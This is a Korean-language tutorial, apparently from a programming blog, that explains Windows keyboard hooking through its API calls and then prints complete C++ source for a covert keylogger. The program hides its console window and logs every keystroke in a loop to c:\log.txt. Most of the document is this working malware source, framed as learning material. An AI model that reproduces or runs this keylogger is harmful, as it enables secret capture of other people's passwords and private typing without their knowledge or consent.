# Hooking - 1

>후킹이란 운영 체제나 응용 소프트웨어 등의 각종 컴퓨터 프로그램에서 소프트에어 구성 요소 간에 발생하는 함수 호출, 메시지, 이벤트 등을 중간에서 바꾸거나 가로채는 명령, 방법, 기술이나 행위를 말한다.
>출처: [위키피디아](https://ko.wikipedia.org/wiki/후킹)

키보드 후킹 소스코드를 살펴보며 후킹에 대해 이해해보자.
```cpp
void Stealth()
{
    HWND Stealth;
    AllocConsole(); 
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth,0);
}
```
후킹 소스에서 공통적으로 볼 수 있는 형태의 로직으로 이는 콘솔 프로그램 실행 시 콘솔 창을 드러내지 않고 동작시키는 내용이다. 사용된 함수 하나 씩 살펴보자.

>BOOL WINAPI AllocConsole(void): 호출 프로세스에 새로운 콘솔을 할당하는 함수로 실패 시 Zero를 반환한다. [MSDN](https://docs.microsoft.com/en-us/windows/console/allocconsole)
>
>HWND WINAPI FindWindowA( 
>  _In_opt_ LPCTSTR lpClassName,
>  _In_opt_ LPCTSTR lpWindowName
>);
>ClassName과 윈도우 명이 일치하는 경우 윈도우 핸들을 가져온다. 실패 시 NULL을 반환한다. [MSDN](https://msdn.microsoft.com/ko-kr/library/windows/desktop/ms633499(v=vs.85).aspx)
>
>BOOL WINAPI ShowWindow(
>  _In_ HWND hWnd,
>  _In_ int  nCmdShow
>);
>윈도우 보여주기 상태를 설정한다. `SW_HIDE: 0`으로 설정 시 창을 숨기고 다른 창을 활성화한다.

이제 이번 예제의 핵심 함수 `GetAsyncKeyState()`와 `GetKeyState()`를 살펴보자.
>SHORT WINAPI GetAsyncKeyState(
>  _In_ int vKey
>);
>[가상 키코드](https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx)를 인자로 하여 함수가 호출되는 시점에 키를 누르고 있는지 아닌지와 이전에 누른적이 있는 지에 대한 정보를 반환한다. [MSDN](https://msdn.microsoft.com/ko-kr/library/windows/desktop/ms646293(v=vs.85).aspx)
>|반환값|설명|
>|:-----:|:-----:|
>|0 (0x0000)|이전에 누른 적이 없고 호출 시점에서 안눌린 상태|
>|0x8000|이전에 누른 적이 없고 호출 시점에서 눌린 상태|
>|0x8001|이전에 누른 적이 있고 호출 시점에서 눌린 상태|
>|1 (0x0001)|이전에 누른 적이 있고 호출 시점에서 안눌린 상태|
>[표 출처: 누구나가 다 이해할 수 있는 프로그래밍 첫걸음](http://blog.eairship.kr/156)

>SHORT WINAPI GetKeyState(
>  _In_ int nVirtKey
>);
>인자로 전달한 가상 키코드의 상태를 가져온다. `GetAsyncKeyState()`함수와의 차이점은 `GetAsyncKeyState()`함수는 메시지 큐와 상관없이 입력하는 순간 즉가적으로 읽어들여 처리하는 반면 `GetKeyState()`함수는 메시지 큐에 키가 눌러졌다는 메시지가 처리되지 않고 남아 있는 것으로 키가 눌러졌음을 보고 처리한다.

전체 소스코드를 살펴보며 동작을 이해하자.
```cpp
#include <iostream>
using namespace std;
#include <windows.h>
#include <winuser.h>

 int getKeyValue(int scanCode) { // shift, caps lock 키 처리
        if (!(GetKeyState(VK_SHIFT) & 0x1000) && !(GetKeyState(VK_CAPITAL) & 0x0001)) {   
			if(scanCode>=0x41 && scanCode<=0x5A)
			scanCode+= 0x20;
        }
		if (!(!(GetKeyState(VK_SHIFT) & 0x1000) && !(GetKeyState(VK_CAPITAL) & 0x0001))) {   
			if(scanCode == 0x31)
	    	scanCode-= 0x10;
		}
        return scanCode;
    }


int Save (int key_stroke, char *file)
{
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen("c:\\log.txt", "a+");
    
    cout << key_stroke << endl;
	key_stroke=getKeyValue(key_stroke);

    if(key_stroke == 8) // 조판 부호 분기문으로 별도 처리하여 기록
    fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
    else if (key_stroke == 13)
    fprintf(OUTPUT_FILE, "\n");
    else if (key_stroke == 32)
    fprintf(OUTPUT_FILE, "%s", " ");
    else if (key_stroke == VK_TAB)
    fprintf(OUTPUT_FILE, "%s", "[TAB]");
    else if (key_stroke == VK_SHIFT)
    fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    else if (key_stroke == VK_CONTROL)
    fprintf(OUTPUT_FILE, "%s", "[CTRL]");
    else if (key_stroke == VK_ESCAPE)
    fprintf(OUTPUT_FILE, "%s", "[ESC]");
	else if (key_stroke == 0x12)
    fprintf(OUTPUT_FILE, "%s", "[ALT]");
	else if (key_stroke == 0x18)
    fprintf(OUTPUT_FILE, "%s", "[ALT]");
	else if (key_stroke == 0x14)
    fprintf(OUTPUT_FILE, "%s", "[CapsLock]");
	else if (key_stroke == 0x15)
    fprintf(OUTPUT_FILE, "%s", "[Hangle]");
	else if (key_stroke == 0x19)
    fprintf(OUTPUT_FILE, "%s", "[HanJa]");
    else if (key_stroke == VK_END)
    fprintf(OUTPUT_FILE, "%s", "[END]");
    else if (key_stroke == VK_HOME)
    fprintf(OUTPUT_FILE, "%s", "[HOME]");
    else if (key_stroke == VK_LEFT)
    fprintf(OUTPUT_FILE, "%s", "[LEFT]");
    else if (key_stroke == VK_UP)
    fprintf(OUTPUT_FILE, "%s", "[UP]");
    else if (key_stroke == VK_RIGHT)
    fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
    else if (key_stroke == VK_DOWN)
    fprintf(OUTPUT_FILE, "%s", "[DOWN]");
    else if (key_stroke == 190 || key_stroke == 110)
    fprintf(OUTPUT_FILE, "%s", ".");
	else
	fprintf(OUTPUT_FILE, "%s", &key_stroke);
    
    fclose (OUTPUT_FILE);
    return 0;
}

//-----------------------------------------------------

void Stealth() // 콘솔 창 감추기
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL); 
    ShowWindow(Stealth,0);
}

//-----------------------------------------------------

//-----------------------------------------------------

int main()
{
  Stealth();
  

    char i;   
    while (1) // 키로깅 반복
    {
        for(i = 8; i <= 190; i++)
        {
            if (GetAsyncKeyState(i) == HC_ACTION)
            Save (i,"log");
        }
    }
    system ("PAUSE");
    return 0;
}


```
